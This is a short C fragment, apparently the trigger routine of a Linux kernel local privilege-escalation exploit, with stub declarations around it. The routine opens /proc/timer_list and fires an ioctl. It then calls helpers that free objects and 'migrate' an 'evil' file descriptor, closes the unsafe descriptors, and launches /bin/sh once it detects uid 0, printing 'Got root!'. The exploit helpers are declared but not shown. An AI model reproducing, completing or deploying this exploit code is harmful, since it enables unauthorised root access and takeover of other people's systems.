
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int O_RDONLY ;
 int __free_stuff () ;
 int __msg (char*) ;
 int close (int ) ;
 int execve (char*,char**,int *) ;
 int getuid () ;
 int ioctl (int,int ,int ) ;
 int migrate_evil_fd () ;
 int open (char*,int ) ;
 int * unsafe_fd ;

__attribute__((used)) static void trigger_fault()
{
  char *argv[]={"/bin/sh", ((void*)0)};
  int fd,i;

  fd = open("/proc/timer_list", O_RDONLY);
  if(fd >= 0)
  {
    ioctl(fd, 0, 0);
    __free_stuff();
    migrate_evil_fd();

    for(i=0; i<4; i++)
      close(unsafe_fd[i]);

    if(!getuid())
    {
      __msg("[**] Got root!\n");
      execve("/bin/sh", argv, ((void*)0));
    }
  }
  else
  {
    __msg("[**] Cannot open /proc/timer_list");
    __free_stuff();
  }
}
